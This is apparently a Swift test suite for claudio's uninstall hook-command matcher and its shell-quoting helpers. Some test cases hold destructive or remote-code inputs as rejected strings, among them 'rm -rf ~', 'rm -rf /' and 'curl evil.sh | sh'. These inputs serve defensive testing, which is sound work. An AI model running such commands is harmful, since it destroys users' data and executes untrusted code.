import ClaudioCore
import Foundation

// MARK: - matchedClaudioEvent(inHookCommand:claudioRoot:) (T13): the structural predicate
// `uninstall`'s removal sweep keys off, so it can recognize a claudio hook command written at
// a path it was never told about in advance (a relocated/historical binary path), while never
// misfiring on a third-party hook — or on a *different* `.claudio` directory that is not this
// user's. See `HookCommandMatching.swift`'s adversarial argument in the doc comment above that
// function for the full "why this can't misfire" case; these tests pin every branch of it
// individually.

private let testRoot = "/Users/tester/.claudio"
private let canonicalPath = "\(testRoot)/bin/claudio"

private func matched(_ command: String, root: String = testRoot) -> Event? {
    matchedClaudioEvent(inHookCommand: command, claudioRoot: root)
}

@MainActor
func runHookCommandMatchingSuites() {
    suite("matchedClaudioEvent: recognizes today's canonical path for every one of the 4 events") {
        for event in Event.allCases {
            let command = "\(canonicalPath) play \(event.cliName)"
            expect(
                matched(command) == event,
                "expected \(event) for \"\(command)\", got \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: round-trips whatever claudioHookCommand actually writes, for"
            + " every event × both a plain and a space-carrying binary path — the writer and"
            + " this matcher are a quoting/unquoting pair, and a drift between them is exactly"
            + " the bug that made uninstall unable to clean up its own entries"
    ) {
        let roots = ["/Users/tester/.claudio", "/Users/John Smith/.claudio"]
        for root in roots {
            for event in Event.allCases {
                let binary = "\(root)/bin/claudio"
                let written = claudioHookCommand(for: event, claudioBinaryPath: binary)
                expect(
                    matched(written, root: root) == event,
                    "uninstall must recognize the exact string install wrote:"
                        + " \"\(written)\" under root \"\(root)\" →"
                        + " \(String(describing: matched(written, root: root)))")
            }
        }
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted space-carrying command — written by a"
            + " pre-quoting claudio, never runnable (the shell split it), but unambiguously"
            + " ours, so uninstall must still be able to remove it"
    ) {
        let spacedRoot = "/Users/John Smith/.claudio"
        let legacy = "/Users/John Smith/.claudio/bin/claudio play stop"
        expect(
            matched(legacy, root: spacedRoot) == .stop,
            "a legacy bare space-carrying command must still match, got"
                + " \(String(describing: matched(legacy, root: spacedRoot)))")
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted command whose home carries an APOSTROPHE."
            + " `'` is the character shellWordContents cannot round-trip out of a bare word: one"
            + " leaves the scan inside a quote, two are silently deleted. Both were removable"
            + " before the writer started quoting (exact string equality on main; whitespace"
            + " tokenizing in this file's first draft), so failing to sweep them is a regression,"
            + " not an unimplemented tolerance"
    ) {
        // One `'`: shellWordContents ends inSingleQuotes and returns nil.
        let oddRoot = "/Users/o'brien/.claudio"
        let oddLegacy = "/Users/o'brien/.claudio/bin/claudio play stop"
        expect(
            matched(oddLegacy, root: oddRoot) == .stop,
            "an unbalanced-quote legacy command must still match, got"
                + " \(String(describing: matched(oddLegacy, root: oddRoot)))")

        // Two `'`: shellWordContents *succeeds*, but strips them — `/Users/o'b'rien` decodes to
        // `/Users/obrien`, which is not prefixed by the real root. Pins that the matcher tries
        // the raw word too, rather than trusting a decode that happened to return non-nil.
        let evenRoot = "/Users/o'b'rien/.claudio"
        let evenLegacy = "/Users/o'b'rien/.claudio/bin/claudio play notification"
        expect(
            matched(evenLegacy, root: evenRoot) == .notification,
            "a lossily-decoded legacy command must still match its real root, got"
                + " \(String(describing: matched(evenLegacy, root: evenRoot)))")

        // The fallback must not widen the destructive surface: the raw word still has to be
        // literally prefixed by *our* root. Another user's apostrophe home stays untouched.
        expect(
            matched(oddLegacy) == nil,
            "the raw-word fallback must not match outside our own root, got"
                + " \(String(describing: matched(oddLegacy)))")
    }

    suite(
        "matchedClaudioEvent: sweeps a LEGACY unquoted command whose home carries a BACKSLASH."
            + " `\\` is the other character shellWordContents refuses (it only ever decodes the"
            + " `'\\''` idiom's), so a bare legacy path containing one used to strand an orphan"
            + " hook in settings.json that uninstall could never remove"
    ) {
        let root = "/Users/a\\b/.claudio"
        let legacy = "/Users/a\\b/.claudio/bin/claudio play stop"
        expect(
            matched(legacy, root: root) == .stop,
            "a legacy bare backslash-carrying command must still match, got"
                + " \(String(describing: matched(legacy, root: root)))")

        expect(
            matched(legacy) == nil,
            "the raw-word fallback must not match outside our own root, got"
                + " \(String(describing: matched(legacy)))")
    }

    suite(
        "matchedClaudioEvent: an apostrophe in the home directory round-trips through the"
            + " '\\'' single-quote idiom"
    ) {
        let root = "/Users/o'brien/.claudio"
        let written = claudioHookCommand(for: .stop, claudioBinaryPath: "\(root)/bin/claudio")
        expect(
            written == "'/Users/o'\\''brien/.claudio/bin/claudio' play stop",
            "premise: the writer emits the POSIX escape idiom, got \(written)")
        expect(
            matched(written, root: root) == .stop,
            "got \(String(describing: matched(written, root: root)))")
    }

    suite(
        "matchedClaudioEvent: rejects a claudio-shaped command under a DIFFERENT .claudio root"
            + " — /tmp, another user's home, a sibling dot-folder. `uninstall` takes no backup,"
            + " so 'some component is named .claudio' must never be mistaken for 'is OUR root'"
    ) {
        let foreignRoots = [
            "/tmp/.claudio/bin/claudio play stop",
            "/Users/someone-else/.claudio/bin/claudio play stop",
            "/Users/tester/project/.claudio/bin/claudio play notification",
            "/Users/tester/.claudio-backup/bin/claudio play stop",
        ]
        for command in foreignRoots {
            expect(
                matched(command) == nil,
                "\"\(command)\" is outside \(testRoot) and must never match, got"
                    + " \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: recognizes a RELOCATED binary path under a different"
            + " subdirectory of the SAME root — the load-bearing case T13 exists for (a future"
            + " release moving bin/ -> libexec/, or any other subpath)"
    ) {
        let relocated = "\(testRoot)/libexec/claudio play stop"
        expect(
            matched(relocated) == .stop,
            "a relocated-but-still-in-root path must still match, got"
                + " \(String(describing: matched(relocated)))")
    }

    suite(
        "matchedClaudioEvent: recognizes the binary living directly at the root (no"
            + " subdirectory at all) — namespace membership doesn't require any particular depth"
    ) {
        let atRoot = "\(testRoot)/claudio play notification"
        expect(matched(atRoot) == .notification, "got \(String(describing: matched(atRoot)))")
    }

    suite(
        "matchedClaudioEvent: rejects a basename mismatch — a DIFFERENT tool living inside our"
            + " own root is not claudio, even with the right trailing argv"
    ) {
        let lookalike = "\(testRoot)/bin/mytool play stop"
        expect(
            matched(lookalike) == nil,
            "a non-\"claudio\"-named binary must never match, got"
                + " \(String(describing: matched(lookalike)))")
    }

    suite(
        "matchedClaudioEvent: rejects a claudio-named binary OUTSIDE the namespace — the task's"
            + " own example of a user's unrelated tool"
    ) {
        for command in ["/usr/local/bin/claudio play stop", "/Users/tester/bin/claudio play stop"] {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite("matchedClaudioEvent: rejects `..` traversal that escapes the root") {
        // Being literally prefixed by the root is NOT the same fact as "resolves inside the
        // root". Each path below is prefixed by it, yet lexically resolves outside — so a
        // prefix check alone would hand uninstall (which takes no backup) an entry that is
        // provably not ours. Assert the escape is real via `standardizingPath` first, so this
        // test can never pass for the wrong reason if that premise ever changes.
        let escapes = [
            "/Users/tester/.claudio/../claudio": "/Users/tester/claudio",
            "/Users/tester/.claudio/bin/../../../usr/bin/claudio": "/Users/usr/bin/claudio",
        ]
        for (rawPath, expectedResolved) in escapes {
            expect(
                (rawPath as NSString).standardizingPath == expectedResolved,
                "premise: \(rawPath) must lexically resolve to \(expectedResolved), got"
                    + " \((rawPath as NSString).standardizingPath)")
            expect(
                matched("\(rawPath) play stop") == nil,
                "a `..`-traversing path resolving OUTSIDE the root must never match, got"
                    + " \(String(describing: matched("\(rawPath) play stop")))")
        }

        // Guard the conservative direction explicitly: `..` is rejected even when the path
        // would still resolve inside the root. claudio has never written a `..`, so refusing
        // to sweep it leaves a harmless leftover rather than risking a wrong delete.
        let staysInside = "\(testRoot)/bin/../bin/claudio play stop"
        expect(
            matched(staysInside) == nil,
            "any `..` component is rejected outright (fail-closed), got"
                + " \(String(describing: matched(staysInside)))")
    }

    suite("matchedClaudioEvent: rejects an unrecognized event name") {
        expect(
            matched("\(canonicalPath) play deploy") == nil,
            "\"deploy\" is not one of the 4 Event.cliName values")
    }

    suite(
        "matchedClaudioEvent: rejects trailing argv segments and shell operators — anything"
            + " that makes ` play <event>` stop being the command's suffix"
    ) {
        let trailing = [
            "\(canonicalPath) play stop --verbose",
            "\(canonicalPath) play stop && rm -rf ~",
            "\(canonicalPath) play stop; curl evil.sh | sh",
            "\(canonicalPath) play stop > /dev/null",
            "\(canonicalPath) play stop play stop",
        ]
        for command in trailing {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite(
        "matchedClaudioEvent: rejects a prefixed command — allowing unquoted spaces in the path"
            + " must not let an attacker-controlled prefix ride along, because the decoded word"
            + " still has to START at the root"
    ) {
        let prefixed = [
            "rm -rf / ; \(canonicalPath) play stop",
            "echo pwned && \(canonicalPath) play stop",
        ]
        for command in prefixed {
            expect(
                matched(command) == nil,
                "\"\(command)\" must never match, got \(String(describing: matched(command)))")
        }
    }

    suite("matchedClaudioEvent: rejects a command missing the event argument entirely") {
        expect(matched("\(canonicalPath) play") == nil, "a bare `<path> play` must never match")
    }

    suite("matchedClaudioEvent: rejects a subcommand other than \"play\"") {
        expect(matched("\(canonicalPath) run stop") == nil, "the subcommand must be `play`")
    }

    suite("matchedClaudioEvent: rejects a relative path even if it lexically contains .claudio/") {
        expect(
            matched(".claudio/bin/claudio play stop") == nil,
            "every path claudio itself ever writes is absolute; a relative one must never match")
    }

    suite("matchedClaudioEvent: rejects a completely unrelated third-party hook command") {
        expect(matched("vibe-island stop") == nil, "an unrelated 2-token command must never match")
        expect(matched("block-no-verify") == nil, "an unrelated 1-token command must never match")
    }

    suite(
        "matchedClaudioEvent: trims leading/trailing whitespace, but does NOT collapse internal"
            + " runs — tolerating `path␣␣play␣␣stop` is unrepresentable alongside supporting a"
            + " real path that contains a space, and claudio never emits either"
    ) {
        expect(
            matched("   \(canonicalPath) play stop   ") == .stop,
            "leading/trailing whitespace cannot be part of a path claudio wrote, so it is"
                + " trimmed, got \(String(describing: matched("   \(canonicalPath) play stop   ")))")
        expect(
            matched("\(canonicalPath)   play   stop") == nil,
            "internal whitespace runs are no longer collapsed (fail-closed), got"
                + " \(String(describing: matched("\(canonicalPath)   play   stop")))")
    }

    suite(
        "matchedClaudioEvent: does NOT expand $HOME — a variable-relative form is not prefixed"
            + " by the resolved root and safely falls through as \"not ours\" (documented"
            + " limitation, not a bug)"
    ) {
        expect(
            matched("$HOME/.claudio/bin/claudio play stop") == nil,
            "no shell expansion is performed")
    }

    suite(
        "matchedClaudioEvent: does NOT strip double quotes — shellQuotedPath emits single"
            + " quotes only, so accepting a double-quoted form would widen the destructive"
            + " match surface for a shape we have never produced"
    ) {
        expect(
            matched("\"\(canonicalPath)\" play stop") == nil,
            "a double-quoted path must not match")
    }

    suite("matchedClaudioEvent: rejects an unterminated single quote") {
        expect(matched("'\(canonicalPath) play stop") == nil, "an unterminated quote must not match")
    }

    suite("matchedClaudioEvent: rejects an empty command string, and an empty root") {
        expect(matched("") == nil, "an empty string must never match")
        expect(
            matched("\(canonicalPath) play stop", root: "") == nil,
            "an empty root must never match anything")
        expect(
            matched("\(canonicalPath) play stop", root: "\(testRoot)/") == nil,
            "a trailing-slash root is rejected rather than silently normalized")
    }

    // MARK: - shellQuotedPath: the writer-side half of the pair

    suite(
        "shellQuotedPath: is the identity function for every path that already works unquoted"
            + " — including non-ASCII — so an upgraded claudio still recognizes its own"
            + " previously-installed hook instead of appending a duplicate"
    ) {
        let unchanged = [
            "/Users/tester/.claudio/bin/claudio",
            "/Users/张三/.claudio/bin/claudio",
            "/Users/a.b-c_d/.claudio/bin/claudio",
            "/Users/tester/.claudio/bin/claudio+1",
        ]
        for path in unchanged {
            expect(
                shellQuotedPath(path) == path,
                "\(path) is already shell-word-safe and must be emitted verbatim, got"
                    + " \(shellQuotedPath(path))")
        }
    }

    suite("shellQuotedPath: quotes exactly the characters that break an unquoted /bin/sh word") {
        let quoted = [
            "/Users/John Smith/.claudio/bin/claudio",
            "/Users/a$b/.claudio/bin/claudio",
            "/Users/a`b/.claudio/bin/claudio",
            "/Users/a*b/.claudio/bin/claudio",
            "/Users/a?b/.claudio/bin/claudio",
            "/Users/a[b/.claudio/bin/claudio",
            // Brace expansion fires on `a{c,d}e` even in POSIX-mode bash, so an unquoted
            // brace-carrying path makes the hook silently exec a path that does not exist.
            "/Users/a{c,d}e/.claudio/bin/claudio",
            "/Users/a;b/.claudio/bin/claudio",
            "/Users/a|b/.claudio/bin/claudio",
            "/Users/a&b/.claudio/bin/claudio",
            "/Users/a>b/.claudio/bin/claudio",
            "/Users/a\nb/.claudio/bin/claudio",
        ]
        for path in quoted {
            expect(
                shellQuotedPath(path).hasPrefix("'") && shellQuotedPath(path).hasSuffix("'"),
                "\(path) would be split, globbed or brace-expanded unquoted and must be quoted,"
                    + " got \(shellQuotedPath(path))")
        }
        expect(shellQuotedPath("") == "''", "the empty word must quote to '', got \(shellQuotedPath(""))")
    }

    suite(
        "shellQuotedPath: a REAL /bin/sh -c execs the intended binary — the unquoted form of a"
            + " glob-carrying path executes a DIFFERENT one, which is why * ? [ are unsafe even"
            + " though an unquoted glob with no sibling match looks like it works"
    ) {
        withTempDirectory { root in
            // Two siblings. The glob `a*b` matches both; the shell picks the first in sort
            // order, which is `a!b` — NOT the directory the path actually names.
            let decoy = root.appendingPathComponent("a!b")
            let real = root.appendingPathComponent("a*b")
            for directory in [decoy, real] {
                try? FileManager.default.createDirectory(
                    at: directory, withIntermediateDirectories: true)
                let script = directory.appendingPathComponent("claudio")
                writeFixture("#!/bin/sh\necho \"$0\"\n", to: script)
                try? FileManager.default.setAttributes(
                    [.posixPermissions: 0o755], ofItemAtPath: script.path)
            }
            let target = real.appendingPathComponent("claudio").path
            let runner = SystemCommandRunner()

            let bare = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", target], timeout: 5.0)
            let quoted = runner.run(
                executablePath: "/bin/sh", arguments: ["-c", shellQuotedPath(target)], timeout: 5.0)

            guard case .completed(_, let bareOut) = bare, case .completed(_, let quotedOut) = quoted
            else {
                expect(false, "premise: both invocations must complete, got \(bare) / \(quoted)")
                return
            }
            expect(
                bareOut.trimmingCharacters(in: .whitespacesAndNewlines)
                    == decoy.appendingPathComponent("claudio").path,
                "premise: unquoted, the glob must run the DECOY binary — that is the bug being"
                    + " fixed. got \(bareOut)")
            expect(
                quotedOut.trimmingCharacters(in: .whitespacesAndNewlines) == target,
                "quoted, /bin/sh must exec exactly the path we named, got \(quotedOut)")
        }
    }

    suite(
        "shellWordContents (via the matcher): rejects a backslash escaping anything but a single"
            + " quote — shellQuotedPath emits no other backslash, so accepting one would widen"
            + " the destructive match surface for a shape we never produced"
    ) {
        expect(
            matched("\(testRoot)/bin/cl\\audio play stop") == nil,
            "a stray backslash must not decode, got"
                + " \(String(describing: matched("\(testRoot)/bin/cl\\audio play stop")))")
        expect(
            matched("\(testRoot)/bin/claudio\\ play stop") == nil,
            "a trailing backslash before a space must not decode")
    }

    // MARK: - claudioNamespaceRoot: how uninstall learns which root to anchor to

    suite("claudioNamespaceRoot: derives the root from any binary path inside it") {
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/bin/claudio") == testRoot,
            "got \(String(describing: claudioNamespaceRoot(forBinaryPath: canonicalPath)))")
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/libexec/claudio")
                == testRoot,
            "a relocated binary still names the same root")
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/John Smith/.claudio/bin/claudio")
                == "/Users/John Smith/.claudio",
            "a space in the home directory must not break root derivation")
    }

    suite(
        "claudioNamespaceRoot: anchors to the FIRST .claudio component, not the last — a nested"
            + " `.claudio/.claudio` must resolve to the outer root, so uninstall's sweep still"
            + " covers everything the installation owns rather than one sub-branch of it"
    ) {
        expect(
            claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")
                == "/Users/tester/.claudio",
            "got \(String(describing: claudioNamespaceRoot(forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")))"
        )
        // And the consequence the choice exists for: an entry in the OUTER root still matches
        // when the binary we were handed lives in the inner one.
        let outerEntry = "/Users/tester/.claudio/bin/claudio play stop"
        let derived = claudioNamespaceRoot(
            forBinaryPath: "/Users/tester/.claudio/.claudio/bin/claudio")!
        expect(
            matchedClaudioEvent(inHookCommand: outerEntry, claudioRoot: derived) == .stop,
            "lastIndex-of would anchor to the inner root and strand the outer entry")
    }

    suite("claudioNamespaceRoot: is fail-closed — nil for anything that names no root") {
        let noRoot = [
            "/usr/local/bin/claudio",
            ".claudio/bin/claudio",
            "/Users/tester/.claudio/../claudio",
            "",
        ]
        for path in noRoot {
            expect(
                claudioNamespaceRoot(forBinaryPath: path) == nil,
                "\(path) names no usable root and must yield nil, got"
                    + " \(String(describing: claudioNamespaceRoot(forBinaryPath: path)))")
        }
    }

    suite(
        "claudioNamespaceRoot: production's real binary path always names a root — the"
            + " fail-closed nil branch is unreachable outside a hand-passed path"
    ) {
        expect(
            claudioNamespaceRoot(forBinaryPath: ClaudioPaths.claudioBinary.path)
                == ClaudioPaths.root.path,
            "the derived root must equal ClaudioPaths.root, got"
                + " \(String(describing: claudioNamespaceRoot(forBinaryPath: ClaudioPaths.claudioBinary.path)))"
        )
    }
}
